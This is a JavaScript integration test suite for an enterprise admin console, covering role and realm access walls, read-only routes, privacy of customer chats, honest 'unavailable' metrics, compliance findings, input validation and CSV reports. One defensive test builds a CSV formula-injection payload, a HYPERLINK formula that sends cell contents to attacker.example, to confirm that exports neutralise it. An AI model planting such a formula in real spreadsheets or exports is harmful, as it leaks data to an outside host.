/**
 * Enterprise administration, driven through the real app.
 *
 * What matters here is the shape of the authority, not the numbers. An
 * administrator may see a great deal and change almost nothing — so these tests
 * are about who gets in, what is deliberately absent, and whether the figures
 * are honest about their own gaps.
 */
process.env.NODE_ENV = "test";
process.env.JWT_SECRET = "test-only-signing-key-not-used-anywhere-real-0123456789";
process.env.RL_AUTH_MAX = "2000";
// The whole suite is one IP and this console loads many panels per screen.
process.env.RL_API_MAX = "5000";
process.env.CLIENT_URL = "http://localhost:3103,http://localhost:3105,http://localhost:3000";

const path = require("path");
const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");

const dbFile = path.join(os.tmpdir(), `aegis-enterprise-${Date.now()}-${process.pid}.db`);
process.env.DATABASE_URL = `file:${dbFile}`;
execSync("npx prisma migrate deploy", { stdio: "ignore" });

const assert = require("node:assert/strict");
const { test, describe, after } = require("node:test");
const request = require("supertest");
const app = require("../src/app");
const { PrismaClient } = require("@prisma/client");
const { toCsv } = require("../src/services/admin.enterprise.service");

const prisma = new PrismaClient();
const ORIGIN = "http://localhost:3103";
const PASSWORD = "correct-horse-battery";

after(async () => {
  await prisma.$disconnect();
  for (const f of [dbFile, `${dbFile}-journal`]) {
    try {
      fs.unlinkSync(f);
    } catch {
      /* ignore */
    }
  }
});

const cookieHeader = (res) =>
  (res.headers["set-cookie"] || []).map((c) => c.split(";")[0]).join("; ");

let seq = 0;
async function account(tag, realm = "CUSTOMER", role = "CUSTOMER") {
  seq += 1;
  const email = `ent-${tag}-${Date.now()}-${seq}@test.com`;
  const res = await request(app)
    .post("/api/v1/auth/register")
    .set("Origin", ORIGIN)
    .send({ name: `Subject ${tag}`, email, password: PASSWORD });
  assert.equal(res.status, 201);

    // Staff accounts belong to a tenant. Since organisation isolation landed, an
    // ENTERPRISE account with no organisation administers nothing and is
    // refused — which is why the fixture now carries one.
    let organizationId = null;
    if (realm !== "CUSTOMER") {
      if (realm === "ENTERPRISE") {
        const org = await prisma.organization.create({
          data: { slug: `ent-fixture-${Date.now()}-${seq}`, name: `Fixture org ${seq}` },
        });
        organizationId = org.id;
      }
      await prisma.user.update({
        where: { id: res.body.data.user.id },
        data: {
          realm,
          role,
          emailVerifiedAt: new Date(),
          ...(organizationId ? { organizationId } : {}),
        },
      });
    }
    return { userId: res.body.data.user.id, email, cookie: cookieHeader(res), organizationId };
}

const admin = () => account("admin", "ENTERPRISE", "ENTERPRISE_ADMIN");

const api = (cookie) => ({
  get: (p) => request(app).get(`/api/v1/enterprise${p}`).set("Cookie", cookie),
});

/**
 * Every console route, so the wall is checked on all of them.
 *
 * The eight below `/security-events` were built across this phase and were
 * covered only at the service layer, where tenant scoping is proven but the
 * route is not. A misnamed `requirePermission`, middleware in the wrong order,
 * or a validation schema that rejects a legitimate call would 403 or 500 in
 * production with every test still green — the failure being silent and in the
 * wrong direction is the whole reason to sweep the list rather than a sample.
 *
 * `/ai-systems` is deliberately absent: it needs `platform.configure`, which no
 * ENTERPRISE role holds, and it has its own test below.
 */
const ADMIN_ENDPOINTS = [
  "/dashboard",
  "/analytics",
  "/customers",
  "/employees",
  "/products",
  "/claims",
  "/workflows",
  "/compliance",
  "/audit",
  "/security-events",
  "/organization",
  "/policies",
  "/renewals",
  "/documents",
  "/intelligence",
  "/support",
  "/notifications",
  "/roles",
];

// ── The wall ─────────────────────────────────────────────────────────────────

describe("Enterprise admin — who may reach it", () => {
  test("a customer is refused everywhere", async () => {
    const customer = await account("customer");
    for (const p of [...ADMIN_ENDPOINTS, "/ai-systems"]) {
      assert.equal((await api(customer.cookie).get(p)).status, 403, `GET ${p}`);
    }
  });

  test("an employee is refused everywhere", async () => {
    // The realm wall, doing the thing a permission check alone could not: an
    // employee holds analytics.read, and must still not reach this console.
    const employee = await account("employee", "EMPLOYEE", "EMPLOYEE");
    for (const p of ADMIN_ENDPOINTS) {
      assert.equal((await api(employee.cookie).get(p)).status, 403, `GET ${p}`);
    }
  });

  test("an unauthenticated request is refused", async () => {
    assert.equal((await request(app).get("/api/v1/enterprise/dashboard")).status, 401);
  });

  test("an enterprise admin gets in", async () => {
    const boss = await admin();
    for (const p of ADMIN_ENDPOINTS) {
      assert.equal((await api(boss.cookie).get(p)).status, 200, `GET ${p}`);
    }
  });

  test("AI monitoring needs platform.configure, which an enterprise admin lacks", async () => {
    // Watching the AI estate is a platform-operator capability, not an
    // organisation administrator's. The realm lets them in the door; the
    // permission still decides the room.
    const boss = await admin();
    assert.equal((await api(boss.cookie).get("/ai-systems")).status, 403);

    const operator = await account("operator", "ENTERPRISE", "PLATFORM_ADMIN");
    assert.equal((await api(operator.cookie).get("/ai-systems")).status, 200);
  });
});

// ── What is deliberately absent ──────────────────────────────────────────────

describe("Enterprise admin — the authority it does not have", () => {
  test("there is no route that changes customer outcomes", async () => {
    // An admin console able to approve a claim would make the human gate in the
    // workflow engine decorative. Every verb here is a read.
    const boss = await admin();
    for (const [method, p] of [
      ["post", "/claims"],
      ["post", "/customers"],
      ["patch", "/customers"],
      ["delete", "/customers"],
      ["post", "/ai-systems"],
    ]) {
      const res = await request(app)
        [method](`/api/v1/enterprise${p}`)
        .set("Cookie", boss.cookie)
        .set("Origin", ORIGIN)
        .send({});
      assert.ok(res.status === 404 || res.status === 405, `${method.toUpperCase()} ${p} → ${res.status}`);
    }
  });

  test("customer records carry no conversation content", async () => {
    // An administrator has a legitimate need to see that a customer exists and
    // what is open for them — and none at all to read what they told an advisor.
    const boss = await admin();
    // The customer belongs to the admin's organisation — otherwise the record
    // is correctly invisible, which would be a different test.
    const customer = await account("private");
    await prisma.user.update({
      where: { id: customer.userId },
      data: { organizationId: boss.organizationId },
    });
    await prisma.chat.create({
      data: { message: "SECRET-CONFIDENTIAL-PHRASE", sender: "customer", userId: customer.userId },
    });
    const res = await api(boss.cookie).get(`/customers/${customer.userId}`);

    assert.equal(res.status, 200);
    assert.ok(!JSON.stringify(res.body).includes("SECRET-CONFIDENTIAL-PHRASE"));
  });
});

// ── Honesty about gaps ───────────────────────────────────────────────────────

describe("Enterprise admin — figures that do not exist say so", () => {
  test("revenue, satisfaction and fraud are marked unavailable, with what is needed", async () => {
    // The alternative is a fabricated number that ends up in a board pack.
    const boss = await admin();
    const res = await api(boss.cookie).get("/dashboard");
    const { overview } = res.body.data;

    for (const key of ["revenue", "customerSatisfaction", "fraudSignals"]) {
      assert.equal(overview[key].available, false, `${key} must not claim a value`);
      assert.ok(overview[key].needs, `${key} must say what would be needed`);
    }
  });

  test("measured figures are marked available", async () => {
    const boss = await admin();
    const { overview } = (await api(boss.cookie).get("/dashboard")).body.data;
    for (const key of ["customers", "employees", "policies", "claims", "documents"]) {
      assert.equal(overview[key].available, true, key);
    }
  });

  test("compliance never claims IRDAI certification", async () => {
    // Software asserting its own regulatory compliance is the most dangerous
    // sentence this product could print.
    const boss = await admin();
    const res = await api(boss.cookie).get("/compliance");
    assert.ok(res.body.data.summary.disclaimer.includes("not a statement of IRDAI compliance"));
  });

  test("product version history is declared absent rather than shown empty", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/products");
    assert.equal(res.body.data.versionHistory.available, false);
  });
});

// ── Compliance checks ────────────────────────────────────────────────────────

describe("Compliance checks find real problems", () => {
  test("an unassigned open case is reported", async () => {
    const boss = await admin();
    await prisma.workItem.create({
      data: {
        kind: "CLAIM",
        reference: `CLM-TEST-${Date.now()}`,
        title: "Nobody owns this",
        status: "OPEN",
        assigneeId: null,
        organizationId: boss.organizationId,
      },
    });
    const res = await api(boss.cookie).get("/compliance");
    const finding = res.body.data.findings.find((f) => f.id === "work-without-owner");
    assert.ok(finding.count >= 1);
  });

  test("a live session on a deactivated account is CRITICAL", async () => {
    const boss = await admin();
    const victim = await account("deactivated");
    await prisma.user.update({
      where: { id: victim.userId },
      data: { isActive: false, organizationId: boss.organizationId },
    });
    const res = await api(boss.cookie).get("/compliance");
    const finding = res.body.data.findings.find((f) => f.id === "live-session-inactive-account");

    assert.equal(finding.severity, "CRITICAL");
    assert.ok(finding.count >= 1, "the live session is caught");
  });

  test("failing checks sort above passing ones", async () => {
    const boss = await admin();
    const findings = (await api(boss.cookie).get("/compliance")).body.data.findings;
    const firstPassing = findings.findIndex((f) => f.count === 0);
    const lastFailing = findings.map((f) => f.count > 0).lastIndexOf(true);
    if (firstPassing !== -1 && lastFailing !== -1) {
      assert.ok(lastFailing < firstPassing, "a passing check never sits above a failing one");
    }
  });

  test("every finding carries a remedy", async () => {
    // A finding without a next step is a complaint, not a control.
    const boss = await admin();
    const findings = (await api(boss.cookie).get("/compliance")).body.data.findings;
    for (const finding of findings) {
      assert.ok(finding.remedy && finding.remedy.length > 10, finding.id);
    }
  });
});

// ── AI monitoring ────────────────────────────────────────────────────────────

describe("AI orchestration centre", () => {
  test("every system reports health, and idle is not health", async () => {
    // A system with no traffic reported green is how an outage goes unnoticed
    // over a quiet weekend.
    const operator = await account("ai-operator", "ENTERPRISE", "PLATFORM_ADMIN");
    const systems = (await api(operator.cookie).get("/ai-systems")).body.data.systems;

    assert.ok(systems.length >= 5);
    for (const system of systems) {
      assert.ok(["HEALTHY", "DEGRADED", "IDLE", "NOT_INSTRUMENTED"].includes(system.health), system.id);
      assert.ok(system.notes, `${system.id} must say what it knows`);
      assert.ok(Array.isArray(system.configurable));
    }
  });

  test("the executive and analytics agents are listed", async () => {
    const operator = await account("ai-exec", "ENTERPRISE", "PLATFORM_ADMIN");
    const ids = (await api(operator.cookie).get("/ai-systems")).body.data.systems.map((s) => s.id);
    assert.ok(ids.includes("executive-agent"));
    assert.ok(ids.includes("analytics-agent"));
  });

  test("the workflow catalogue matches what the engine runs", async () => {
    const boss = await admin();
    const { catalogue } = (await api(boss.cookie).get("/workflows")).body.data;

    assert.equal(catalogue.length, 4);
    for (const definition of catalogue) {
      assert.ok(definition.decisionSteps > 0, `${definition.definition} has no human decision`);
    }
  });
});

// ── Row caps ─────────────────────────────────────────────────────────────────

describe("Row caps over HTTP", () => {
  // The service honours `take`; these prove the route actually hands it over,
  // which is the half the console depends on and nothing covered.
  test("take reaches the service through the route", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/customers?take=1");
    assert.equal(res.status, 200);
    assert.ok(res.body.data.customers.length <= 1);
  });

  test("a junk take is refused rather than silently ignored", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/customers?take=abc");
    // Silently defaulting answered 200 with the default page, so a caller could
    // not tell a working filter from an ignored one.
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "VALIDATION_ERROR");
    assert.match(res.body.message, /take/);
  });

  test("a filter nobody could type is refused", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get(`/customers?search=${"x".repeat(500)}`);
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "VALIDATION_ERROR");
  });

  test("a malformed customer id is a 400, not a driver error", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/customers/not-a-uuid");
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "VALIDATION_ERROR");
  });

  test("an unserved report format is named rather than quietly ignored", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/reports/operations?format=pdf");
    // Anything but csv used to fall through to JSON, so a client asking for PDF
    // got JSON and no indication that PDF does not exist.
    assert.equal(res.status, 400);
    assert.match(res.body.message, /format/);
  });

  test("a valid filter still passes straight through", async () => {
    const boss = await admin();
    for (const path of ["/customers?search=ada&take=5", "/audit?action=auth.login", "/policies?status=ACTIVE"]) {
      assert.equal((await api(boss.cookie).get(path)).status, 200, `${path} must still work`);
    }
  });

  test("an absurd take is answered with the maximum, not an error", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/employees?take=99999");
    assert.equal(res.status, 200, "a caller asking for too much gets rows, not a 400");
    assert.ok(res.body.data.employees.length <= 100);
    assert.ok(res.body.data.capacity, "the workforce shape survives an empty tenant");
  });
});

// ── Reports ──────────────────────────────────────────────────────────────────

describe("Reports", () => {
  test("an unknown report is refused", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/reports/nonsense");
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "UNKNOWN_REPORT");
  });

  test("generating one is recorded", async () => {
    // Reports leave the platform. Who generated which, and when, is exactly
    // what an auditor asks about afterwards.
    const boss = await admin();
    await api(boss.cookie).get("/reports/operations");
    await new Promise((resolve) => setTimeout(resolve, 200));

    const entry = await prisma.auditLog.findFirst({
      where: { actorId: boss.userId, action: "admin.report.generated" },
    });
    assert.ok(entry);
  });

  test("csv export sets a download disposition with a safe filename", async () => {
    const boss = await admin();
    const res = await api(boss.cookie).get("/reports/compliance?format=csv");

    assert.equal(res.status, 200);
    assert.match(res.headers["content-type"], /text\/csv/);
    assert.match(res.headers["content-disposition"], /attachment; filename="aegis-compliance-\d{4}-\d{2}-\d{2}\.csv"/);
  });

  test("csv quotes every field, so a comma in a sentence cannot shift a column", () => {
    const csv = toCsv([{ a: 'has "quotes"', b: "has, comma" }]);
    assert.equal(csv, '"a","b"\n"has ""quotes""","has, comma"');
  });

  test("an empty report produces empty output rather than a broken header", () => {
    assert.equal(toCsv([]), "");
  });

  /**
   * Quoting satisfies a CSV parser; it does not stop a spreadsheet evaluating a
   * cell. Branch names reach the branch report, and a report is the one thing
   * here designed to leave the platform — so a branch named `=HYPERLINK(...)`
   * would otherwise arrive as a working link in an executive's inbox.
   */
  for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
    test(`csv neutralises a field opening with ${JSON.stringify(lead)}`, () => {
      const payload = `${lead}HYPERLINK("https://attacker.example"&A1,"Loading")`;
      const csv = toCsv([{ branch: payload }]);
      assert.match(csv, /^"branch"\n"'/, "the value must be prefixed so it is read as text");
      // The text itself survives — this is a display convention, not redaction.
      assert.ok(csv.includes("HYPERLINK"), "the original value must still be present");
    });
  }

  test("csv leaves an ordinary value untouched", () => {
    assert.equal(toCsv([{ branch: "Madurai" }]), '"branch"\n"Madurai"');
  });
});
